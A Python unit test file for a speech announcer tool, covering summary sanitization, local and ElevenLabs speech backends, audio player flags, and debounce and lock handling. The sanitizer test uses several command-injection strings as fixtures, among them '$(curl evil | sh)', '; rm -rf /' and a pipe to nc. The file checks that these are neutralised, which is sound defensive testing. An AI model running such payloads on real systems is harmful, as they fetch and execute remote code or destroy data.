import json
import subprocess
import tempfile
import unittest
from pathlib import Path
from unittest import mock

from announcer.config import DEFAULTS
from announcer import speech
from announcer.summarize import _sanitize_summary


class SanitizerTests(unittest.TestCase):
    def test_injection_characters_are_replaced(self):
        cases = {
            "$(curl evil | sh)": "curl evil sh",
            "`touch bad`": "touch bad",
            "; rm -rf /": "rm -rf",
            "hello | nc evil": "hello nc evil",
            "one & two": "one two",
            'say "hello"': "say hello",
            "agent's work": "agent s work",
        }
        for source, expected in cases.items():
            with self.subTest(source=source):
                self.assertEqual(_sanitize_summary(source), expected)

    def test_unicode_letters_digits_and_allowed_punctuation_survive(self):
        self.assertEqual(
            _sanitize_summary("Élodie 完成 １２, déjà-vu! Really? yes."),
            "Élodie 完成 １２, déjà-vu! Really? yes.",
        )

    def test_whitespace_collapses_and_word_cap_remains(self):
        source = " \t\n ".join("word{}".format(index) for index in range(50))
        self.assertEqual(len(_sanitize_summary(source).split()), 40)


class LocalBackendTests(unittest.TestCase):
    def config(self):
        return dict(DEFAULTS)

    @mock.patch.object(speech.platform, "system", return_value="Darwin")
    @mock.patch.object(speech.subprocess, "run")
    def test_macos_say_receives_text_on_stdin(self, run, _system):
        config = self.config()
        config["voice"] = "Samantha"

        self.assertEqual(speech.run_local_speech(config, "-danger"), "say")

        self.assertEqual(run.call_args.args[0], ["say", "-v", "Samantha"])
        self.assertEqual(run.call_args.kwargs["input"], "-danger")

    @mock.patch.object(speech.platform, "system", return_value="Linux")
    @mock.patch.object(speech.subprocess, "run")
    def test_linux_probe_order_and_stdin_shape(self, run, _system):
        run.side_effect = [
            OSError("missing"),
            OSError("missing"),
            subprocess.CompletedProcess(["espeak"], 0),
        ]
        reasons = []

        backend = speech.run_local_speech(self.config(), "-danger", reasons)

        self.assertEqual(backend, "espeak")
        self.assertEqual(
            [call.args[0] for call in run.call_args_list],
            [["spd-say", "-e", "-w"], ["espeak-ng"], ["espeak"]],
        )
        self.assertTrue(all(call.kwargs["input"] == "-danger" for call in run.call_args_list))
        self.assertEqual(run.call_args_list[0].kwargs["timeout"], 5)

    @mock.patch.object(speech.platform, "system", return_value="Linux")
    @mock.patch.object(speech.subprocess, "run")
    def test_spd_say_timeout_falls_through_to_espeak_ng(self, run, _system):
        run.side_effect = [
            subprocess.TimeoutExpired(["spd-say"], 5),
            subprocess.CompletedProcess(["espeak-ng"], 0),
        ]
        reasons = []

        backend = speech.run_local_speech(self.config(), "hello", reasons)

        self.assertEqual(backend, "espeak-ng")
        self.assertIn("spd-say: timeout", reasons)


class ElevenLabsTests(unittest.TestCase):
    def config(self):
        config = dict(DEFAULTS)
        config["elevenlabs_api_key"] = "secret"
        return config

    @mock.patch.object(speech, "run_local_speech", return_value="espeak-ng")
    @mock.patch.object(speech.urllib.request, "urlopen")
    @mock.patch.object(speech, "_audio_player", return_value=None)
    def test_no_player_skips_paid_api_call(self, _player, urlopen, local):
        with tempfile.TemporaryDirectory() as directory:
            reasons = []
            backend = speech.speak(
                self.config(), "hello", Path(directory), reasons=reasons
            )

        self.assertEqual(backend, "espeak-ng")
        urlopen.assert_not_called()
        local.assert_called_once()
        self.assertIn("elevenlabs: no-player", reasons)

    @mock.patch.object(speech, "play_audio_file", return_value="elevenlabs")
    @mock.patch.object(speech, "synthesize_elevenlabs")
    @mock.patch.object(speech, "_audio_player", return_value=("paplay", True))
    def test_raw_only_player_requests_pcm(self, _player, synthesize, play):
        with tempfile.TemporaryDirectory() as directory:
            audio = Path(directory) / "audio.pcm"
            audio.write_bytes(b"pcm")
            synthesize.return_value = audio

            backend = speech.speak(self.config(), "hello", Path(directory))

        self.assertEqual(backend, "elevenlabs")
        self.assertEqual(synthesize.call_args.kwargs["output_format"], "pcm_22050")
        self.assertEqual(play.call_args.args[1:], ("paplay", True))

    @mock.patch.object(speech.subprocess, "run")
    def test_raw_player_flags(self, run):
        path = Path("audio.pcm")
        speech.play_audio_file(path, "paplay", True)
        self.assertEqual(
            run.call_args.args[0],
            [
                "paplay",
                "--raw",
                "--rate=22050",
                "--channels=1",
                "--format=s16le",
                "audio.pcm",
            ],
        )


class StateAndLockTests(unittest.TestCase):
    def test_debounce_record_and_rollback_use_real_lock_file(self):
        with tempfile.TemporaryDirectory() as directory:
            state_dir = Path(directory)
            self.assertFalse(
                speech.check_and_record_debounce(state_dir, "pane", "done", 30)
            )
            self.assertTrue(
                speech.check_and_record_debounce(state_dir, "pane", "done", 30)
            )

            speech.rollback_debounce(state_dir, "pane", "done")

            state = json.loads((state_dir / "last.json").read_text(encoding="utf-8"))
            self.assertNotIn("pane", state)
            self.assertFalse(
                speech.check_and_record_debounce(state_dir, "pane", "done", 30)
            )

    def test_saving_state_prunes_entries_older_than_24_hours(self):
        with tempfile.TemporaryDirectory() as directory:
            state_dir = Path(directory)
            state = {
                "old": {"status": "done", "ts": 1.0},
                "recent": {"status": "done", "ts": 90000.0},
            }
            speech.save_debounce_state(
                state_dir, state, "new", "blocked", 90001.0
            )
            saved = speech.load_debounce_state(state_dir / "last.json")

        self.assertNotIn("old", saved)
        self.assertIn("recent", saved)
        self.assertIn("new", saved)

    def test_playback_lock_gives_up_with_injected_tiny_budget(self):
        import fcntl

        with tempfile.TemporaryDirectory() as directory:
            state_dir = Path(directory)
            held = (state_dir / "speak.lock").open("a+")
            fcntl.flock(held.fileno(), fcntl.LOCK_EX | fcntl.LOCK_NB)
            now = [0.0]

            def sleep(seconds):
                now[0] += seconds

            reasons = []
            try:
                with self.assertRaises(speech.PlaybackLockTimeout):
                    with speech.playback_lock(
                        state_dir,
                        reasons=reasons,
                        timeout=1.0,
                        poll_interval=0.25,
                        clock=lambda: now[0],
                        sleeper=sleep,
                    ):
                        self.fail("lock must not be acquired")
            finally:
                fcntl.flock(held.fileno(), fcntl.LOCK_UN)
                held.close()

        self.assertEqual(reasons, ["playback-lock: timeout"])


if __name__ == "__main__":
    unittest.main()
